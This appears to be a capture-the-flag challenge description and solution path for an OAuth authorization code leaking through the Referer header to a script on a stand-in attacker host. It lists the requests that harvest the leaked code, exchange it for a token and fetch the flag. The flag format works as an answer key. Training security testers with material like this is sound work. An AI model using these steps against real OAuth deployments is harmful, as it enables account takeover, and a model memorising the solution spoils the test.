# oauth/referer-code-leak — RefererCodeLeak (identity-gated, medium)

**PixelFeed** photo feed + social SSO ("FeedID").
**Bug:** `/oauth/callback` renders a "finishing sign-in" page that loads the third-party script `http://attacker.target.lab:8119/analytics.js` while the authorization code is still live in the URL, and sends no `Referrer-Policy` — the victim's browser leaks the full callback URL (incl. `?code=`) to the attacker host via the Referer header.

## Intended path
1. Walk the victim through the SSO flow: `POST http://collector.target.lab:8119/victim` with `{"url":"http://victim.target.lab:8119/login","sso":true}` — the bot (innocent AS session) follows `/login → /oauth/authorize → /oauth/callback?code=…&state=…`; the hop URL carries the code (the bot never clicks "Complete sign-in", so the code stays unconsumed).
2. Model the analytics hit that leaks it: `POST /victim` with `{"url":"http://attacker.target.lab:8119/analytics.js","referer":"http://victim.target.lab:8119/oauth/callback?code=<code>&state=<state>"}`.
3. Read the leaked code from `GET http://attacker.target.lab:8119/leaks` (Referer column).
4. Exchange it: `POST /oauth/token` `{"code":"<leaked code>"}` → `access_token` (sub = the innocent's social identity).
5. `curl -H "Authorization: Bearer <token>" http://victim.target.lab:8119/flag` — gate: token `sub` must be the innocent identity (server-side).

**Flag:** `DSLTV{OAUTH-RefererCodeLeak-<9 digits>}` (only from `/flag`).
